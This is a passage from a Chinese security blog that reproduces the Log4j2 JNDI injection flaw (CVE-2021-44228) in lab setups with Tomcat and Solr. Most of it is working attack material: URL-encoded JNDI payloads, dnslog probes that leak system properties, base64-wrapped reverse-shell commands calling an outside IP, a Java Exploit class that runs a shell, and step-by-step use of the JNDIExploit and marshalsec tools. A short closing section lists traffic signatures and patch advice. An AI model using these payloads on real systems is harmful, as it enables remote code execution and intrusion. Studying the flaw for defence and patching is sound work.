class="line">http://124.223.217.243:28080/hello/?payload=%24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用url编码后的payload进行发送，refresh  dnslog网站，查看是否有返回ok？</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送请求的话，需要全部url编码，burp中选中payload，右键即可全部转换为url编码</span></span><br><span class="line">payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%6c%35%77%37%63%76%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222048048.png" alt="image-20220922204858881" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222050719.png" alt="image-20220922205003522" style="zoom:50%;" /><p>Post方式：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /hello HTTP/1.1</span><br><span class="line">Host: 124.223.217.243:28080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.57</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: csrftoken=sc2j11fPfqKlk6m0EYxXKtpNuUCeccNs8t0Fuxq4k0kcYdk6b0ilBpy9xaPchp10; session=12967580-f066-4068-8ba6-91afc14e68d1.rXkKzehkONdyIbho79CnnaKBvRU; toggle=true; portainer.pagination_images=50; portainer.pagination_containers=25</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">payload=$&#123;jndi:ldap://a8x0nz.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p>dnslog的结果意味着，目标机器有通过<strong>jndi的方式访问ldap</strong>，ldap是轻量级目录访问协议，会向<code>a8x0nz.dnslog.cn</code>发起请求。在请求<code>a8x0nz.dnslog.cn</code>域名的时候，就会有一个域名解析的过程。解析该域名的时候，就会被记录到该dnslog网站之中。</p><blockquote><p>同理我们可以用rmi的方式请求，漏洞复现二之中有写</p></blockquote><p><strong>当有解析记录的时候，这意味着目标网站存在该漏洞！！~</strong></p><p><strong><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222004035.png" alt="image-20220922200454642" style="zoom: 33%;" /></strong></p><p>我们在请求子域1111.a8x0nz.dnslog.cn的时候，依旧会解析到a8x0nz.dnslog.cn上，会存在解析的记录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222012201.png" alt="image-20220922201242966" style="zoom: 33%;" /><h2 id="EXP测试"><a href="#EXP测试" class="headerlink" title="EXP测试"></a>EXP测试</h2><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>下载JNDIExploit工具</p><blockquote><p><a href="https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2">https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2</a></p><p>该工具可以快速搭建一个JNDI服务</p><p>关于该工具！！在使用<strong>反序列化，jndi注入等情景</strong>的时候，可以想到用此工具</p><p><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code>查看具体的语法，也是蛮好用的</p><p>实现了诸多功能</p><p>关于反序列化这方面知识了解的较少：</p><blockquote><ul><li>Gadget是指利用链</li><li>cc1是指CommonsCollectionsK1</li><li>cc2是指CommonsCollectionsK2</li></ul></blockquote></blockquote></li><li><p>使用JNDIExploit工具搭建恶意JNDI服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看选项</span></span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -h</span><br><span class="line">-i, --ip       Local ip address</span><br><span class="line">    -l, --ldapPort Ldap bind port (default: 1389)#ldap服务</span><br><span class="line">    -p, --httpPort Http bind port (default: 8080)#http服务</span><br><span class="line">    -u, --usage    Show usage (default: false)</span><br><span class="line">    -h, --help     Show this help</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搭建</span></span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 124.223.217.243</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222104305.png" alt="image-20220922210418072"></p><blockquote><p>有时该工具会抛出一个异常，显示ldap的1389端口被占用了~~，但是实际上并没有，不用管这个问题即可</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221718477.png" alt="image-20220922171815325" style="zoom: 33%;" /></blockquote></li><li><p>启动监听端口接收shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure></li><li><p>构造EXP</p></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反弹shell命令</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/8888 0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">base64</span>编码 -&gt; url编码</span></span><br><span class="line"><span class="meta prompt_">YmFzaCAtaSA%</span><span class="language-bash">2BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx</span></span><br></pre></td></tr></table></figure><p>得到反弹shell的EXP：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx&#125;</span></span><br></pre></td></tr></table></figure><p>对EXP进行URL编码：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.223.217.243%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FYmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx%7D</span></span><br></pre></td></tr></table></figure><ol start="5"><li>发送Payload请求：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221719387.png" alt="image-20220922171918288" style="zoom: 33%;" /><ol start="6"><li><p>弹回shell</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222129656.png" alt="image-20220922212906478" style="zoom:50%;" /></li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>当我们发送请求后，若网站存在漏洞，则会向ldap服务器发送请求（也就是我们之前用<code>JNDIExploit</code>搭建的JDNI恶意服务，其架设在<code>124.223.217.243:1389</code>端口上。）</p><p>当我们请求到了JNDI服务器之后，其会在<code>/TomcatBypass/Command/Base64/</code>接口下，对我们附带的payload进行base64解密。然后将结果（也就是payload）返回给网站（受害机器）执行</p><p>我们需要注意，JNDI是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。我们访问搭建的恶意LDAP，便拿到了返回的经过解码的fantanshell的命令</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222129130.png" alt="image-20220922212939903"></p><p>加载执行后，在监听的端口上便会拿到shell</p></blockquote><h1 id="漏洞复现二"><a href="#漏洞复现二" class="headerlink" title="漏洞复现二"></a>漏洞复现二</h1><blockquote><p>涉及solr组件</p><p>Solr是一个可扩展的，可部署，搜索&#x2F;存储引擎，优化搜索大量以文本为中心的数据</p><blockquote><p> <a href="https://www.cnblogs.com/Ge-Zsj/p/14510115.html">什么是Solr,它能为我们解决什么问题,怎么用?</a></p></blockquote></blockquote><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>docker-compose.yml</p></blockquote><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">solr:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/solr:8.11.0</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8983:8983&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#目标</span><br><span class="line">http://124.223.217.243:8983/solr/</span><br></pre></td></tr></table></figure><h2 id="POC测试-1"><a href="#POC测试-1" class="headerlink" title="POC测试"></a>POC测试</h2><p>到了solr界面上，就导出点点看，看看有什么地方可以输入的，去找可以插入的地方，尝试插入poc测试~~</p><p>于是找得到在这个地方~~插入构造的payload</p><p>还有可疑的参数，都可以插一插</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222302406.png" alt="image-20220922230202224" style="zoom:33%;" /><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面两种皆可</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用java获取系统版本，若成功，意味着我们可以获取更多信息</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:java.version&#125;</span>.tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://124.223.217.243:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.tjxy78.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222304824.png" alt="image-20220922230411716" style="zoom:50%;" /><blockquote><p>一旦探测成功，也就是我们可以构造各种各样的payload获取各种系统属性：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取java路径</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:java.home&#125;</span>.tjxy78.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取用户名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:user.name&#125;</span>.qj1n1s.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222314706.png" alt="image-20220922231403614" style="zoom:50%;" /><blockquote><p>java可以获取的系统属性，可以参考如下文章</p><ul><li><a href="https://www.cnblogs.com/blogsme/p/3299711.html">java系统属性</a></li><li><a href="https://blog.csdn.net/u010675669/article/details/86150754">java系统属性（Java System Properties）</a></li></ul></blockquote></blockquote><h2 id="EXP测试-1"><a href="#EXP测试-1" class="headerlink" title="EXP测试"></a>EXP测试</h2><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>下载 JNDI-Injection-Exploit 工具</p><blockquote><p>感觉这个工具比前面的那个JNDI Exploit工具好用一点</p></blockquote><blockquote><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</a></p></blockquote></li><li><p>构造命令执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/9090 0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">base64</span>编码</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx</span><br></pre></td></tr></table></figure><p>为了payload能被<code>java-runtime-exec</code>执行，需要对之进行转换：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></li><li><p>工具使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">就这一个用法</span></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;command&quot; -A address</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload：</span></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 124.223.217.243</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行结果</span></span><br><span class="line">[ADDRESS] &gt;&gt; 124.223.217.243</span><br><span class="line">[COMMAND] &gt;&gt; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">----------------------------JNDI Links----------------------------</span><br><span class="line">Target environment(Build in JDK 1.7 whose trustURLCodebase is true):</span><br><span class="line">rmi://124.223.217.243:1099/ovhvdw</span><br><span class="line">ldap://124.223.217.243:1389/ovhvdw</span><br><span class="line">Target environment(Build in JDK 1.8 whose trustURLCodebase is true):</span><br><span class="line">rmi://124.223.217.243:1099/dgne6a</span><br><span class="line">ldap://124.223.217.243:1389/dgne6a</span><br><span class="line">Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):</span><br><span class="line">rmi://124.223.217.243:1099/yvdh2q</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在这些端口上开启了监听，等待访问</span></span><br><span class="line">----------------------------Server Log----------------------------</span><br><span class="line">2022-09-22 23:44:12 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180</span><br><span class="line">2022-09-22 23:44:12 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099</span><br><span class="line">2022-09-22 23:44:12 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>从工具返回给我们的payload我们可以看到，我们不仅可以利用ldap，也可以使用rmi方式进行getshell</p></blockquote></li><li><p>得到反弹shell的EXP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意选择对应java版本的payload。至于怎么获得java版本嘛，前面有讲到，很简单</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Target environment(Build <span class="keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="literal">true</span>):</span></span><br><span class="line">rmi://124.223.217.243:1099/dgne6a</span><br><span class="line">ldap://124.223.217.243:1389/dgne6a</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">套上<span class="string">&quot;壳&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:rmi://124.223.217.243:1099/dgne6a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 9090</span><br></pre></td></tr></table></figure></li><li><p>发送EXP</p></li></ol><blockquote><p>我们访问随机产生的接口路径<code>/dgne6a</code>，就会返回在目标机器上执行**[COMMAND] &gt;&gt;** <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:rmi://124.223.217.243:1099/dgne6a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">http://124.223.217.243:8983/solr/admin/cores?action=$&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>得到shell</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230021150.png" alt="image-20220923002110054" style="zoom:50%;" /><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>发送payload之后，便会使用jndi向rmi发起请求，</p><p>rmi再向远程恶意服务器<code>124.223.217.243:1099</code>的<code>/dgne6a</code>接口发起请求，</p><p>rmi访问接口即是远程加载类的过程，但此时加载的是我们搭建的恶意rmi服务的恶意类，并执行恶意类的方法，这个方法之中就是我们直接写入反弹shell的方法</p><p>在日志中我们也可以看到工具所生成的恶意类文件(.class)：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230035762.png" alt="image-20220923003513323"></p></blockquote><h1 id="漏洞复现三"><a href="#漏洞复现三" class="headerlink" title="漏洞复现三"></a>漏洞复现三</h1><blockquote><p>手动编写代码利用，在讲fastjson的时候，有讲到手动编写代码+jndi+rmi&#x2F;ldap的方式，加载恶意类对之利用的方法</p><p>手动的利用，有助于理解上述工具的工作过程！~~</p></blockquote><h2 id="编写并编译恶意代码"><a href="#编写并编译恶意代码" class="headerlink" title="编写并编译恶意代码"></a>编写并编译恶意代码</h2><blockquote><p>Touch.java</p><blockquote><p>touch在&#x2F;tmp目录生成一个alvin的文件</p></blockquote></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Touch.java</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Touch</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Touch</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/touch /tmp/alvin&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Touch</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Touch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译生成恶意类</span></span><br><span class="line">javac Touch.java</span><br></pre></td></tr></table></figure><blockquote><p>Exploit.java</p><blockquote><p>反弹shell:<code>bash -i &gt;&amp; /dev/tcp/124.223.217.243/4433 0&gt;&amp;1</code></p></blockquote></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Exploit.java</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c &#123;echo,</span></span><br><span class="line"><span class="string">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvNDQzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译生成恶意类</span></span><br><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在java文件目录下启动http服务，供远程下载恶意类</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><h2 id="启动LDAP服务"><a href="#启动LDAP服务" class="headerlink" title="启动LDAP服务"></a>启动LDAP服务</h2><ul><li><p>创建文件touch</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载完恶意类后，用工具起一个LDAP服务,</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">&quot;http://124.223.217.243:8000/#Touch&quot;</span>是供远程加载的恶意类文件，注意！！是供远程加载</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">marshalsec.jndi.LDAPRefServer指定了启动的服务类型</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://124.223.217.243:8000/#Touch&quot; 9999</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://120.27.61.239:8000/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure></li></ul><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4433</span><br></pre></td></tr></table></figure><h2 id="发送Payload"><a href="#发送Payload" class="headerlink" title="发送Payload"></a>发送Payload</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建文件</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.71.45.28:9999/Touch&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送的话需要URL编码：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.71.45.28%3A9999%2FTouch%7D</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反弹shell</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.71.45.28:9999/Exploit&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送的话需要URL编码：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.71.45.28%3A9999%2FExploit%7D</span></span><br></pre></td></tr></table></figure><h2 id="得到Shell"><a href="#得到Shell" class="headerlink" title="得到Shell"></a>得到Shell</h2><p>在监听位置可以拿到shell</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h2><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>当我们发送payload<code>$&#123;jndi:ldap://124.71.45.28:9999/Exploit&#125;</code>的时候，会使用jndi向我们搭建的ldap服务器发起请求，请求<strong>Exploit</strong>这个类，</p><p>在LDAP服务器那边，会重定向调用远程类（也就是我们http起的服务上面的类文件）</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230101463.png" alt="image-20220923010131357"></p><p>会向<code>http://124.223.217.243:8000/Exploit</code>发起请求，加载其恶意类，然后执行其恶意方法反弹shell</p></blockquote><h1 id="log4j2漏洞流量特征"><a href="#log4j2漏洞流量特征" class="headerlink" title="log4j2漏洞流量特征"></a>log4j2漏洞流量特征</h1><blockquote><p>这个流量特征怎么判断呢，一方面是payload大概长什么样子，结果前面的学习可以知道，大概的轮廓</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">很显然，利用jndi，多多少少有下面字样</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>更多的变体可以查看log4j2扫描工具里面那些大佬写的payload。实际上log4j2工具也就是根据特征，判断网站有莫有log4j2的漏洞~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231250273.png" alt="image-20220923125013065"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LDAP - $(indi:Idap://example.com/GQ)</span><br><span class="line">LDAP - $(jndi:ldap://example.com/jw&#125;</span><br><span class="line">RMI  - $(ndi:rmi://example.com&#125;</span><br><span class="line">RMI  - $($[lower:$(lower:jndi):$[lower:rmi)://example.com/&#125;</span><br><span class="line">RMI  - $($[lower:jndi):$&#123;lower:rmi)://example.com/FcrY&#125;</span><br><span class="line">RMI  - $($(lower:j)$(lower:n)$(lower:d&#125;i:$&#123;lower:rmi)://example.com/glvLd&#125;</span><br><span class="line">RMI  - $($(lower:j)$(upper:n)$(lower:d&#125;$(upper:i):$&#123;lower:r&#125;m$(lower:i])://example.com/zPc&#125;</span><br><span class="line">DNS  - $(jndi:dns://example.com/zVu)</span><br><span class="line">LDAP - $(jndi:$(lower:I)$[lower:d)a$(lower:p)://example.com/Hp&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h1><h2 id="通用修补建议"><a href="#通用修补建议" class="headerlink" title="通用修补建议"></a>通用修补建议</h2><blockquote><p>升级到最新版本 2.15.0-rc2 ：<br><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p></blockquote><h2 id="临时修补建议"><a href="#临时修补建议" class="headerlink" title="临时修补建议"></a>临时修补建议</h2><blockquote><ol><li>设置JVM启动参数 <code>-Dlog4j2.formatMsgNoLookups=true</code> 。</li><li>尽量使用JDK 版本大于11.0.1、8u191、7u201、6u211，需要注意的是，即使是使用了 JDK 高版本也不能完全保证安全，依然存在本地绕过的情况。</li><li>限制不必要的业务访问外网。</li><li>采用 rasp 对 lookup 的调用进行阻断。</li><li>设置“log4j2.formatMsgNoLookups&#x3D;True” </li><li>系统环境变量“FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS”设置 为“true”</li></ol></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><p><a href="https://zhuanlan.zhihu.com/p/444140910">log4j 远程命令执行漏洞原理及修复方案</a></p></li><li><p><a href="https://www.pudn.com/news/6279fcca517cd20ea4ea47b9.html%E4%B8%80%E7%9C%8B%E4%BE%BF%E6%87%82">https://www.pudn.com/news/6279fcca517cd20ea4ea47b9.html一看便懂</a></p></li><li><p><a href="https://www.yijinglab.com/expc.do?ec=ECID34f9-9847-48b5-85b4-20e9d3bbcd94">log4j2漏洞    CVE-2021-44228 log4jRCE漏洞复现</a></p></li><li><p><a href="https://www.freebuf.com/sectool/313774.html">Apache Log4j2 RCE原理验证和复现</a></p></li><li><p><a href="https://www.jianshu.com/p/1517b8c8ebf9">核弹级!log4j 2漏洞原理及复现</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/TJTOh0q0OY-j6msP6XSErg">JAVA JNDI注入知识详解</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
